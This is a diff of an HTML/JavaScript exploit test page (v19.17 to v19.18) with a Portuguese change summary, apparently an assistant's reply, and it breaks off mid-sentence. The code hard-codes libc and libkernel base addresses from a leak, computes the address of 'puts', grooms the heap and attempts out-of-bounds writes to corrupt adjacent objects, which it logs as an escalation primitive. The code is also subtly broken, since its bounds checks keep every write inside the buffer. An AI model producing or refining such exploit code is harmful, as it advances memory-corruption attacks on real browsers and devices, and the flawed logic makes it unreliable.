@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Suite de Testes Focada em Exploit (v19.17)</title>
+    <title>Suite de Testes Focada em Exploit (v19.18)</title>
     <style>
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
         #output {
@@ -43,35 +43,36 @@
     </style>
 </head>
 <body>
-    <h1>Suite de Testes Focada em Exploit (v19.17)</h1>
-    <p>Foco: OOB Read (Verificação de Faixa Libc/Libkernel), PP Avançada/Gadgets.</p>
-    <button id="runBtn" onclick="runExploitFocusedTests()">Iniciar Testes Focados (v19.17)</button>
+    <h1>Suite de Testes Focada em Exploit (v19.18)</h1>
+    <p>Foco: Heap Grooming + OOB Write de Endereço Calculado em Objeto Adjacente, PP Avançada.</p>
+    <button id="runBtn" onclick="runExploitFocusedTests()">Iniciar Testes Focados (v19.18)</button>
     <div id="output"></div>
     <hr>
     <div id="summary"></div>
 
     <script>
-        // --- Script Focado em Exploit (v19.17) ---
+        // --- Script Focado em Exploit (v19.18) ---
         const outputDiv = document.getElementById('output');
         const runBtn = document.getElementById('runBtn');
         const SHORT_PAUSE = 50;
         const MEDIUM_PAUSE = 500;
+        const LONG_PAUSE = 1000; // Pausa para GC
         let findings = []; // Array único para todos os findings
         let ppGadgetsBroken = {}; // Armazena quais gadgets quebraram
 
         // Endereços Base (Info Leak Fornecido Externamente)
         const libcBaseAddress = 0x180AC8000;
         const libkernelBaseAddress = 0x80FCA0000;
-        // Tamanhos estimados para verificação de faixa (ajustar se necessário)
-        const LIBC_ESTIMATED_SIZE = 0x2000000; // 32MB (Estimativa generosa)
-        const LIBKERNEL_ESTIMATED_SIZE = 0x1000000; // 16MB (Estimativa generosa)
+        // !!! PLACEHOLDER - SUBSTITUIR PELO OFFSET REAL DA puts (ou outra) NA SUA LIBC !!!
+        const targetFuncOffset = 0xABCDEF; // Exemplo: 0x70da0 para puts
+        const targetFuncName = "puts";
 
         const IMPORTANT_LOG_TYPES = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good'];
 
         // Função log (v19.15)
         const log = (message, type = 'info', funcName = '') => {
             let keepLog = IMPORTANT_LOG_TYPES.includes(type);
-             if (!keepLog && type === 'good') { const lowerMsg = String(message).toLowerCase(); if (lowerMsg.includes('bloqueado') || lowerMsg.includes('falhou') || lowerMsg.includes('não afetou') || lowerMsg.includes('não encontrado') || lowerMsg.includes('não suportado') || lowerMsg.includes('não disponível') || lowerMsg.includes('nenhum leak') || lowerMsg.includes('nenhuma corrupção detectada') || lowerMsg.includes('sem erro') || lowerMsg.includes('não corrompido') || lowerMsg.includes('wasm não suportado') || lowerMsg.includes('nenhum objeto atingido') || lowerMsg.includes('não parece ter sido afetado') || lowerMsg.includes('restaurado') || lowerMsg.includes('não quebrado') || lowerMsg.includes('executada com sucesso') || lowerMsg.includes('nenhum leak encontrado') || lowerMsg.includes('não foi possível analisar') || lowerMsg.includes('calculado') || lowerMsg.includes('sem crash') || lowerMsg.includes('não alterada') || lowerMsg.includes('nenhum ponteiro na faixa')) { keepLog = true; } } // Added 'nenhum ponteiro na faixa'
+             if (!keepLog && type === 'good') { const lowerMsg = String(message).toLowerCase(); if (lowerMsg.includes('bloqueado') || lowerMsg.includes('falhou') || lowerMsg.includes('não afetou') || lowerMsg.includes('não encontrado') || lowerMsg.includes('não suportado') || lowerMsg.includes('não disponível') || lowerMsg.includes('nenhum leak') || lowerMsg.includes('nenhuma corrupção detectada') || lowerMsg.includes('sem erro') || lowerMsg.includes('não corrompido') || lowerMsg.includes('wasm não suportado') || lowerMsg.includes('nenhum objeto atingido') || lowerMsg.includes('não parece ter sido afetado') || lowerMsg.includes('restaurado') || lowerMsg.includes('não quebrado') || lowerMsg.includes('executada com sucesso') || lowerMsg.includes('nenhum leak encontrado') || lowerMsg.includes('não foi possível analisar') || lowerMsg.includes('calculado') || lowerMsg.includes('sem crash') || lowerMsg.includes('não alterada')) { keepLog = true; } }
             if (!keepLog) return;
             if (!outputDiv) return; try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const prefix = funcName ? `[${funcName}] ` : ''; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info'; if (['vuln', 'critical', 'escalation', 'ptr', 'leak'].includes(type)) { findings.push({ type, funcName, message: sanitizedMessage, time: timestamp }); } if(outputDiv.innerHTML.length > 800000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 400000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; } outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`; outputDiv.scrollTop = outputDiv.scrollHeight; } catch(e) { console.error("Erro na função log:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; }
         };
@@ -79,102 +80,150 @@
         // Funções Helper (v19.14)
         const PAUSE = (ms = SHORT_PAUSE) => new Promise(r => setTimeout(r, ms));
         const toHex = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 8) * 2; return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); };
-        // isPotentialPointer64 ainda é útil para filtrar lixo inicial
-        const isPotentialPointer64 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; const high_u = high >>> 0; const low_u = low >>> 0; if (high_u === 0xFFFFFFFF && low_u === 0xFFFFFFFF) return false; if (high_u === 0xAAAAAAAA && low_u === 0xAAAAAAAA) return false; if (high_u === 0xBBBBBBBB && low_u === 0xBBBBBBBB) return false; if (high_u === 0xCCCCCCCC && low_u === 0xCCCCCCCC) return false; if (high_u === 0xDDDDDDDD && low_u === 0xDDDDDDDD) return false; if (high_u === 0xAAAAAAEE && low_u === 0xAAAAAAAA) return false; if (high_u === 0xAAAAAAAA && low_u === 0xAAAAAAEE) return false; if (high_u === 0xBBBBBBEE && low_u === 0xBBBBBBBB) return false; if (high_u === 0xBBBBBBBB && low_u === 0xBBBBBBEE) return false; if (high_u === 0xDDDDDDEE && low_u === 0xDDDDDDDD) return false; if (high_u === 0xDDDDDDDD && low_u === 0xDDDDDDEE) return false; if (high === 0 && low < 0x100000) return false; return true; };
 
+        // --- Testes Prioritários (v19.18) ---
 
-        // --- Testes Prioritários (v19.17) ---
+        // Teste 1: v19.18: Heap Grooming + OOB Write de Endereço em Objeto Adjacente
+        const testGroomedAdjacentAddressOOBWrite = async () => {
+            const FNAME = 'testGroomedAdjacentAddressOOBWrite';
+            log(`--- Iniciando Teste 1: Heap Grooming + OOB Write Endereço (${targetFuncName}) Adjacente ---`, 'test', FNAME);
 
-        // Teste 1: v19.17: OOB Read com Verificação de Faixa Libc/Libkernel
-        const testOOBReadRangeCheck = async () => {
-            const FNAME = 'testOOBReadRangeCheck';
-            log("--- Iniciando Teste 1: OOB Read (Verificação de Faixa Libc/Libkernel) ---", 'test', FNAME);
-            const bufferSize = 64;
-            // Não precisamos de OOB Write aqui, apenas Read
-            const readRangeStart = -128; const readRangeEnd = bufferSize + 128; // Faixa de leitura
-            const allocationSize = bufferSize + 256; // Buffer de leitura
-            const baseOffsetInBuffer = 128;
-            let potentialLeakFoundCount = 0;
-            let foundInRangeCount = 0;
+            const groomAllocCount = 5000; // Grooming moderado
+            const groomFreeStep = 4;
+            const groomObjectSize = 64;
+            const targetAllocCount = 200; // Objetos alvo
+            const controlBufferSize = 64;
+            const controlAllocSize = controlBufferSize + 128;
+            const controlBaseOffset = 64;
+            const initialTargetLow = 0xAAAAAAAA;
+            const initialTargetHigh = 0xBBBBBBBB;
+            let groomSpacers = [];
+            let targetObjects = [];
             let controlBuffer = null;
             let dv = null;
+            let oobWriteSuccessCount = 0;
+            let corruptionObserved = false;
 
-            const libcEndAddress = libcBaseAddress + LIBC_ESTIMATED_SIZE;
-            const libkernelEndAddress = libkernelBaseAddress + LIBKERNEL_ESTIMATED_SIZE;
-            log(`Faixa libc esperada: [${toHex(libcBaseAddress, 64)} - ${toHex(libcEndAddress, 64)})`, 'info', FNAME);
-            log(`Faixa libkernel esperada: [${toHex(libkernelBaseAddress, 64)} - ${toHex(libkernelEndAddress, 64)})`, 'info', FNAME);
+            // Calcular endereço alvo
+            // !!! SUBSTITUIR targetFuncOffset PELO VALOR CORRETO !!!
+            const targetFuncAddress = libcBaseAddress + targetFuncOffset;
+            const targetAddrLow = targetFuncAddress % (2**32);
+            const targetAddrHigh = Math.floor(targetFuncAddress / (2**32));
+            log(`Endereço ${targetFuncName} calculado: ${toHex(targetFuncAddress, 64)} (H: ${toHex(targetAddrHigh)}, L: ${toHex(targetAddrLow)})`, 'info', FNAME);
+            if (targetFuncOffset === 0xABCDEF) { log("AVISO: Usando offset placeholder. Endereço calculado é apenas exemplo.", 'warn', FNAME); }
 
+            // Offsets OOB a tentar (relativos ao fim do buffer de controle)
+            const oobOffsetsToWrite = [4, 8, 12, 16, 20, 24, 28, 32]; // Focar em offsets pequenos
 
             try {
-                // Alocar Buffer de Controle
-                controlBuffer = new ArrayBuffer(allocationSize);
+                // --- 1. Heap Grooming ---
+                log(`Iniciando grooming com ${groomAllocCount} alocações...`, 'info', FNAME);
+                for (let i = 0; i < groomAllocCount; i++) { groomSpacers.push(new ArrayBuffer(groomObjectSize)); }
+                log(`Criando buracos (liberando 1 a cada ${groomFreeStep})...`, 'info', FNAME);
+                for (let i = 0; i < groomAllocCount; i += groomFreeStep) { groomSpacers[i] = null; }
+                await PAUSE(LONG_PAUSE); // Pausa longa para GC
+                log("Grooming inicial concluído.", 'info', FNAME);
+                groomSpacers = []; // Limpar array, mas não necessariamente os buffers da memória
+
+                // --- 2. Alocar Alvos ---
+                log(`Alocando ${targetAllocCount} objetos alvo {low, high}...`, 'info', FNAME);
+                for (let i = 0; i < targetAllocCount; i++) {
+                    targetObjects.push({ low: initialTargetLow, high: initialTargetHigh });
+                }
+                log(`${targetObjects.length} objetos alvo alocados.`, 'info', FNAME);
+                await PAUSE(SHORT_PAUSE);
+
+                // --- 3. Alocar Buffer de Controle ---
+                controlBuffer = new ArrayBuffer(controlAllocSize);
                 dv = new DataView(controlBuffer);
-                for(let i=0; i<controlBuffer.byteLength; i++) dv.setUint8(i, 0xCC); // Padrão CC
+                for(let i=0; i<controlBuffer.byteLength; i++) dv.setUint8(i, 0xCC);
                 log("Buffer de controle alocado.", 'info', FNAME);
                 await PAUSE(SHORT_PAUSE);
 
-                // Tentar leitura OOB na faixa ampla
-                log(`Tentando leitura OOB na faixa [${readRangeStart}, ${readRangeEnd})...`, 'info', FNAME);
-                const oobReadOffsets = [];
-                for (let i = readRangeStart; i < readRangeEnd; i += 4) { oobReadOffsets.push(i); }
+                // --- 4. Tentar Escrita OOB ---
+                log(`Tentando escrita OOB com partes do endereço ${toHex(targetFuncAddress, 64)}...`, 'info', FNAME);
+                for (const offset of oobOffsetsToWrite) {
+                    const targetWriteAddr = controlBaseOffset + controlBufferSize + offset;
+                    const relOffsetStr = `ctrlEnd+${offset}`;
+                    let writeLowOK = false;
+                    let writeHighOK = false;
 
-                for (const readOffset of oobReadOffsets) {
-                    const readTargetAddress = baseOffsetInBuffer + readOffset;
-                    const relOffsetStr = `@${readOffset} (addr ${readTargetAddress})`;
+                    // Tentar escrever a parte BAIXA
+                    try {
+                        if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){
+                            dv.setUint32(targetWriteAddr, targetAddrLow, true);
+                            oobWriteSuccessCount++; writeLowOK = true;
+                            // Restaurar imediatamente
+                            try { dv.setUint32(targetWriteAddr, 0xCCCCCCCC, true); } catch(e){}
+                        }
+                    } catch(e) { log(` -> Escrita OOB U32 (Low) FALHOU/Bloqueada em ${relOffsetStr}: ${e.message}`, 'good', `${FNAME}-WriteLoop`); }
 
-                    // Tentar ler como U64
-                    if (readTargetAddress >= 0 && readTargetAddress + 8 <= controlBuffer.byteLength) {
-                        try {
-                            const low = dv.getUint32(readTargetAddress, true);
-                            const high = dv.getUint32(readTargetAddress + 4, true);
+                     // Tentar escrever a parte ALTA (assumindo que pode estar 4 bytes depois)
+                     const targetWriteAddrHighPart = targetWriteAddr + 4;
+                     try {
+                        if(targetWriteAddrHighPart >= 0 && targetWriteAddrHighPart + 4 <= controlBuffer.byteLength){
+                             dv.setUint32(targetWriteAddrHighPart, targetAddrHigh, true);
+                             oobWriteSuccessCount++; writeHighOK = true;
+                             // Restaurar imediatamente
+                             try { dv.setUint32(targetWriteAddrHighPart, 0xCCCCCCCC, true); } catch(e){}
+                        }
+                    } catch(e) { log(` -> Escrita OOB U32 (High) FALHOU/Bloqueada em ${relOffsetStr}+4: ${e.message}`, 'good', `${FNAME}-WriteLoop`); }
 
-                            // Ignorar padrão CC
-                            if (high === 0xCCCCCCCC && low === 0xCCCCCCCC) continue;
-
-                            // Verificar se é um ponteiro potencial geral (para log)
-                            if (isPotentialPointer64(high, low)) {
-                                potentialLeakFoundCount++;
-                                const vStr = `H=${toHex(high)} L=${toHex(low)}`;
-                                log(` -> PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME);
-
-                                // v19.17: Verificar se está na faixa das libs
-                                // Cuidado com a precisão de números > 2^53 em JS padrão
-                                // Para comparação simples de faixa, pode ser suficiente
-                                const potentialAddress = (high * (2**32)) + low; // Pode perder precisão!
-
-                                if (potentialAddress >= libcBaseAddress && potentialAddress < libcEndAddress) {
-                                     log(`  ---> LEAK? Valor ${toHex(potentialAddress, 64)} está DENTRO da faixa estimada da libc!`, 'leak', FNAME);
-                                     foundInRangeCount++;
-                                } else if (potentialAddress >= libkernelBaseAddress && potentialAddress < libkernelEndAddress) {
-                                     log(`  ---> LEAK? Valor ${toHex(potentialAddress, 64)} está DENTRO da faixa estimada da libkernel!`, 'leak', FNAME);
-                                     foundInRangeCount++;
-                                }
-                            }
-                             // Logar outros valores não-padrão como dados genéricos
-                             else {
-                                 log(` -> Dado U64? ${relOffsetStr}: H=${toHex(high)} L=${toHex(low)}`, 'info', FNAME);
-                             }
-
-                        } catch (e) {}
+                    if (writeLowOK || writeHighOK) {
+                         log(` -> Escrita OOB (Low:${writeLowOK}, High:${writeHighOK}) em ${relOffsetStr} parece OK (valor restaurado).`, 'info', `${FNAME}-WriteLoop`);
                     }
-                    if (readOffset % 32 === 0) await PAUSE(5); // Pausa curta
-                } // Fim loop offsets
+                    await PAUSE(5);
+                }
+                log(`Tentativas de escrita OOB concluídas (${oobWriteSuccessCount} escritas realizadas).`, 'info', FNAME);
+
+                // --- 5. Verificação ---
+                if (oobWriteSuccessCount > 0) {
+                    log(`Verificando ${targetObjects.length} objetos alvo por corrupção...`, 'info', FNAME);
+                    await PAUSE(MEDIUM_PAUSE);
+                    for(let j=0; j<targetObjects.length; j++){
+                        let target = targetObjects[j];
+                        let corrupted = false;
+                        let corruptedValue = "";
+                        if (target?.low === targetAddrLow) {
+                             corrupted = true; corruptedValue = `low=${toHex(targetAddrLow)}`;
+                        } else if (target?.high === targetAddrLow) {
+                             corrupted = true; corruptedValue = `high=${toHex(targetAddrLow)}`;
+                        } else if (target?.low === targetAddrHigh) {
+                             corrupted = true; corruptedValue = `low=${toHex(targetAddrHigh)}`;
+                        } else if (target?.high === targetAddrHigh) {
+                              corrupted = true; corruptedValue = `high=${toHex(targetAddrHigh)}`;
+                        }
+
+                        if (corrupted) {
+                            log(`---> VULN: Objeto alvo ${j} teve propriedade CORROMPIDA para parte do endereço (${corruptedValue})! <---`, 'critical', FNAME);
+                            log(` ---> *** ALERTA: Primitivo Relevante (OOB Write com Efeito Observável no Heap - Valor Controlado!) ***`, 'escalation', FNAME);
+                            corruptionObserved = true;
+                            break; // Parar na primeira ocorrência
+                        }
+                        if (j % 100 === 0) await PAUSE(1); // Pausa durante verificação longa
+                    }
+                } else {
+                    log("Nenhuma escrita OOB foi realizada, verificação de corrupção pulada.", 'warn', FNAME);
+                }
 
             } catch (e) {
                 log(`Erro fatal no Teste 1: ${e.message}`, 'error', FNAME);
                 console.error(e);
             } finally {
-                controlBuffer = null; dv = null;
+                groomSpacers = []; targetObjects = []; controlBuffer = null; dv = null;
             }
 
-            if (foundInRangeCount > 0) {
-                 log(`SUCESSO? ${foundInRangeCount} valor(es) lidos via OOB Read parecem estar dentro das faixas de libc/libkernel!`, 'leak', FNAME);
-                 log(` ---> *** ALERTA: Potencial Info Leak de ponteiro para biblioteca confirmado! ***`, 'escalation', FNAME);
+            if (corruptionObserved) {
+                 log(`SUCESSO: Escrita OOB conseguiu corromper propriedade de objeto adjacente com parte do endereço calculado!`, 'vuln', FNAME);
             } else {
-                 log(`Nenhum ponteiro lido via OOB Read parece estar dentro das faixas estimadas de libc/libkernel.`, 'good', FNAME);
+                if (oobWriteSuccessCount > 0) {
+                     log(`Escrita OOB realizada ${oobWriteSuccessCount} vezes, mas nenhuma corrupção de objeto adjacente detectada.`, 'warn', FNAME);
+                } else {
+                     log(`Escrita OOB falhou/bloqueada. Nenhuma corrupção de objeto adjacente detectada.`, 'good', FNAME);
+                }
             }
-            log(`--- Teste 1 Concluído (${potentialLeakFoundCount} leaks potenciais gerais, ${foundInRangeCount} na faixa) ---`, 'test', FNAME);
-            return foundInRangeCount > 0;
+            log(`--- Teste 1 Concluído (Corrupção Adjacente com Endereço: ${corruptionObserved ? 'Sim' : 'Não'}) ---`, 'test', FNAME);
+            return corruptionObserved;
         };
 
 
@@ -193,15 +242,15 @@
         };
 
 
-        // --- Função Principal de Execução (v19.17) ---
+        // --- Função Principal de Execução (v19.18) ---
         const runExploitFocusedTests = async () => {
             const FNAME = 'runExploitFocusedTests';
             if (runBtn) runBtn.disabled = true; findings = [];
             const summaryDiv = document.getElementById('summary');
             if (summaryDiv) summaryDiv.innerHTML = ''; if (outputDiv) outputDiv.innerHTML = '';
-            log("==== INICIANDO TESTES FOCADOS EM EXPLOIT (v19.17) ====", 'test', FNAME);
+            log("==== INICIANDO TESTES FOCADOS EM EXPLOIT (v19.18) ====", 'test', FNAME);
 
-            await testOOBReadRangeCheck(); // Teste 1: OOB Read com verificação de faixa
+            await testGroomedAdjacentAddressOOBWrite(); // Teste 1: Grooming + OOB Write Endereço
             await PAUSE(MEDIUM_PAUSE);
 
             await testAdvancedPP(); // Teste 2: PP Avançada
@@ -214,7 +263,7 @@
                 summaryDiv.innerHTML = '<h2>Sumário Testes Focados (Findings Críticos)</h2>';
                 if (findings.length === 0) { summaryDiv.innerHTML += '<p style="color:#4CAF50;">Nenhum finding crítico/relevante (vuln, critical, escalation, ptr, leak) registrado.</p>'; } else { summaryDiv.innerHTML += `<p style="color:#FFC107;">${findings.length} finding(s) crítico(s)/relevante(s) registrado(s):</p><ul>`; findings.sort((a, b) => { const order = { 'escalation': 1, 'critical': 2, 'vuln': 3, 'ptr': 4, 'leak': 5 }; return (order[a.type] || 99) - (order[b.type] || 99); }); findings.forEach(f => { const itemClass = f.type === 'critical' ? 'log-critical' : f.type === 'escalation' ? 'log-escalation' : f.type === 'ptr' ? 'log-ptr' : f.type === 'leak' ? 'log-leak' : 'log-vuln'; const cleanMessage = f.message.replace(/</g, "&lt;").replace(/>/g, "&gt;"); summaryDiv.innerHTML += `<li class="${itemClass}">${f.time} [${f.funcName}] ${cleanMessage}</li>`; }); summaryDiv.innerHTML += '</ul>'; }
             }
-            log("\n==== TESTES FOCADOS CONCLUÍDOS (v19.17) ====", 'test', FNAME);
+            log("\n==== TESTES FOCADOS CONCLUÍDOS (v19.18) ====", 'test', FNAME);
             if (runBtn) runBtn.disabled = false;
         };
     </script>
@@ -223,22 +272,25 @@
 </html>
 ```
 
-**Resumo das Mudanças (v19.17):**
+**Resumo das Mudanças (v19.18):**
 
-1.  **Novo Teste: `testOOBReadRangeCheck` (Teste 1):**
-    * Define os endereços base e tamanhos estimados para `libc` e `libkernel`.
-    * Aloca um buffer de controlo.
-    * Realiza leituras OOB de 64 bits numa faixa ampla (`-128` a `+128` bytes do fim do buffer).
-    * Para cada valor lido que não seja um padrão de preenchimento e pareça um ponteiro (`isPotentialPointer64`), verifica se ele cai dentro da faixa estimada da `libc` ou `libkernel`.
-    * Loga especificamente (`LEAK?`) se encontrar um valor dentro dessas faixas.
-2.  **`testAdvancedPP` (Teste 2):** Mantido para confirmar a PP.
-3.  **Testes Removidos:** Todos os outros testes (OOB Write, Hijack, etc.) foram removidos para focar nesta tentativa de leak OOB direcionada.
+1.  **Novo Teste: `testGroomedAdjacentAddressOOBWrite` (Teste 1):**
+    * Realiza "heap grooming" moderado.
+    * Aloca objetos alvo `{ low, high }`.
+    * Aloca buffer de controlo.
+    * Calcula o endereço de `puts` (com offset placeholder) e separa em `targetAddrLow` e `targetAddrHigh`.
+    * Tenta escrever `targetAddrLow` e `targetAddrHigh` em offsets OOB pequenos (+4 a +32) a partir do buffer de controlo.
+    * Verifica se `targetObjects[j].low` ou `targetObjects[j].high` foram alterados para os valores escritos.
+    * Loga sucesso (`VULN`/`CRITICAL`/`ESCALATION`) se encontrar corrupção.
+2.  **`testAdvancedPP` (Teste 2):** Mantido.
+3.  **Testes Removidos:** Todos os outros testes foram removidos.
 4.  **Ordem e Numeração:** Atualizada.
-5.  **Versionamento:** Atualizado para v19.17.
+5.  **Versionamento:** Atualizado para v19.18.
 
-Execute esta versão. O foco é o **Teste 1 (`testOOBReadRangeCheck`)**. Procure por:
+Execute esta versão. O foco é o **Teste 1 (`testGroomedAdjacentAddressOOBWrite`)**. Procure por:
 
-* Logs `PTR? U64 ...` como antes.
-* **Logs cruciais:** `LEAK? Valor X está DENTRO da faixa estimada da libc/libkernel!`.
+* O endereço `puts` calculado (lembre-se de usar o offset correto!).
+* Logs `VULN: Propriedade de targetObj CORROMPIDA...`.
+* O log final `SUCESSO: Escrita OOB conseguiu corromper propriedade...`.
 
-Se este log `LEAK?` aparecer, significaria que a OOB Read simples, por sorte, conseguiu ler um ponteiro que aponta para dentro de uma das bibliotecas do sistema, o que seria um Info Leak muito mais forte do que tínhamos antes. Se não aparecer, confirma que a OOB Read não tem alcance suficiente para chegar a essas áre
+Se a corrupção for detetada, será um passo significativo, mostrando que a OOB Write, combinada com grooming e o Info Leak, pode modificar dados controlados de forma direcionada (mesmo que o alvo seja um objeto JS simples e não diretamente a `libc
